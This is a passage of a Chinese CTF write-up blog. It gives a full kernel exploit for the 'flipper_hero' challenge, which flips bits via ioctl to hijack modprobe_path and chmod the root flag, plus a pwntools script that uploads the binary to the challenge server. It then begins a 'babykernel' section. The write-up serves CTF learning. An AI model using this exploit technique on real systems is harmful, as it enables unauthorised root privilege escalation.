38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
</pre></td><td class="rouge-code"><pre><span class="cp">#define _GNU_SOURCE
</span>
<span class="cp">#include</span> <span class="cpf">"minilib.h"</span><span class="cp">
</span>

<span class="kt">void</span> <span class="nf">modprobe_rce</span><span class="p">(){</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '#!/bin/sh</span><span class="se">\n</span><span class="s">/bin/chmod 777 /root/flag.txt</span><span class="se">\n</span><span class="s">' &gt; /home/ctf/e1"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /home/ctf/e1"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff' &gt; /home/ctf/e2"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /home/ctf/e2"</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">struct</span> <span class="n">buf</span><span class="p">{</span>
<span class="kt">size_t</span> <span class="n">ptr</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">idx</span><span class="p">;</span>
<span class="p">};</span>



<span class="kt">int</span> <span class="nf">doMain</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">target</span> <span class="o">=</span> <span class="mh">0xffffffff82dd4940</span><span class="p">;</span>

    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/flipper_hero"</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>

    <span class="k">struct</span> <span class="n">buf</span> <span class="n">me_buf</span><span class="p">;</span>

    <span class="c1">//int xor_list</span>
    <span class="c1">// 0x01 0x02 0x04 0x08 0x10 0x20 0x40 0x80</span>
    <span class="n">me_buf</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">target</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">target</span><span class="o">+</span><span class="mi">2</span><span class="p">;</span>
    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">target</span><span class="o">+</span><span class="mi">3</span><span class="p">;</span>
    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">target</span><span class="o">+</span><span class="mi">4</span><span class="p">;</span>
    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">target</span><span class="o">+</span><span class="mi">5</span><span class="p">;</span>
    <span class="n">me_buf</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">target</span><span class="o">+</span><span class="mi">6</span><span class="p">;</span>
    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">target</span><span class="o">+</span><span class="mi">7</span><span class="p">;</span>
    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">target</span><span class="o">+</span><span class="mi">8</span><span class="p">;</span>
    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">target</span><span class="o">+</span><span class="mi">9</span><span class="p">;</span>
    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">target</span><span class="o">+</span><span class="mi">10</span><span class="p">;</span>
    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">target</span><span class="o">+</span><span class="mi">11</span><span class="p">;</span>
    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">target</span><span class="o">+</span><span class="mi">12</span><span class="p">;</span>
    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">me_buf</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x13370001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">me_buf</span><span class="p">);</span>

    <span class="n">modprobe_rce</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">extern</span> <span class="kt">void</span> <span class="nf">_start</span><span class="p">(){</span>
    <span class="n">doMain</span><span class="p">();</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h3 id="exploit-remte"><span class="me-2">exploit-remte</span><a href="#exploit-remte" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
</pre></td><td class="rouge-code"><pre><span class="n">cat</span> <span class="n">remote_exp</span><span class="p">.</span><span class="n">py</span> 
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>

<span class="n">cmd</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./run.sh</span><span class="sh">'</span>
<span class="c1">#io = process(cmd.split(' '))
#io = remote('192.168.100.23',32773)
</span><span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">c51-flipper-hero-t100484-ktcenglta6bbwnizrsnwexgl.hkcert24.pwnable.hk</span><span class="sh">"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="n">ssl</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">/ $ </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">/ $ </span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#ru('id=1000 gid=1000 groups=1000\r\n')
</span>

<span class="n">exp</span> <span class="o">=</span> <span class="nf">b64encode</span><span class="p">(</span><span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">exploit</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()).</span><span class="nf">decode</span><span class="p">()</span>
<span class="n">line_length</span> <span class="o">=</span> <span class="mi">76</span> <span class="o">*</span> <span class="mi">2</span>
<span class="n">explist</span> <span class="o">=</span> <span class="p">[</span><span class="n">exp</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">line_length</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">exp</span><span class="p">),</span> <span class="n">line_length</span><span class="p">)]</span>


<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">explist</span><span class="p">:</span>
    <span class="n">cmd</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">echo -n </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">| base64 -d &gt;&gt; /home/ctf/exp</span><span class="sh">'</span>
    <span class="c1">#print(cmd)
</span>    <span class="nf">sl</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">/ $ </span><span class="sh">'</span><span class="p">)</span>


<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#ru('id=1000 gid=1000 groups=1000\r\n')
</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">/ $ </span><span class="sh">'</span><span class="p">)</span>


<span class="nf">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
    <span class="n">cmd</span> <span class="o">=</span><span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;&gt;&gt; </span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">cmd</span><span class="p">.</span><span class="nf">encode</span><span class="p">())</span>
    <span class="nf">s</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
    <span class="nf">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
        <span class="n">d</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">d</span><span class="o">==</span><span class="sa">b</span><span class="sh">''</span><span class="p">:</span>
            <span class="k">break</span>
        <span class="n">data</span> <span class="o">+=</span> <span class="n">d</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">decode</span><span class="p">().</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="se">\r</span><span class="sh">'</span><span class="p">,</span><span class="sh">''</span><span class="p">))</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="c1">#print(ru('~ $ ').decode().replace('\r',''))
</span>

<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h2 id="babykernel"><span class="me-2">babykernel</span><a href="#babykernel" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>2024-11-16-1337UP LIVE CTF
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<h3 id="保护"><span class="me-2">保护</span><a href="#保护" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ul>
  <li>启动参数 kaslr 保护</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>qemu-system-x86_64 <span class="se">\</span>
    <span class="nt">-m</span> 64M <span class="se">\</span>
    <span class="nt">-kernel</span> ./bzImage <span class="se">\</span>
    <span class="nt">-initrd</span> ./rootfs.cpio <span class="se">\</span>
    <span class="nt">-append</span> <span class="s2">"console=ttyS0 oops=panic panic=1 quiet loglevel=3 kpti=off kaslr"</span> <span class="se">\</span>
    <span class="nt">-nographic</span> <span class="se">\</span>
    <span class="nt">-no-reboot</span> <span class="se">\</span>
    <span class="nt">-monitor</span> /dev/null
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<ul>
  <li>init</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/sh</span>

<span class="nb">export </span><span class="nv">PS1</span><span class="o">=</span><span class="s1">'\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '</span>

<span class="o">[</span> <span class="nt">-d</span> /dev <span class="o">]</span> <span class="o">||</span> <span class="nb">mkdir</span> <span class="nt">-m</span> 0755 /dev
<span class="o">[</span> <span class="nt">-d</span> /sys <span class="o">]</span> <span class="o">||</span> <span class="nb">mkdir</span> <span class="nt">-m</span> 0755 /sys
<span class="o">[</span> <span class="nt">-d</span> /proc <span class="o">]</span> <span class="o">||</span> <span class="nb">mkdir</span> <span class="nt">-m</span> 0755 /proc
<span class="o">[</span> <span class="nt">-d</span> /etc <span class="o">]</span> <span class="o">||</span> <span class="nb">mkdir</span> <span class="nt">-m</span> 0755 /etc

<span class="nb">echo</span> <span class="s1">'root:x:0:0:root:/root:/bin/sh'</span> <span class="o">&gt;</span> /etc/passwd
<span class="nb">echo</span> <span class="s1">'ctf:x:1337:1337:ctf:/home/ctf:/bin/sh'</span> <span class="o">&gt;&gt;</span> /etc/passwd
<span class="nb">echo</span> <span class="s1">'root:x:0:'</span> <span class="o">&gt;</span> /etc/group
<span class="nb">echo</span> <span class="s1">'ctf:x:1337:'</span> <span class="o">&gt;&gt;</span> /etc/group

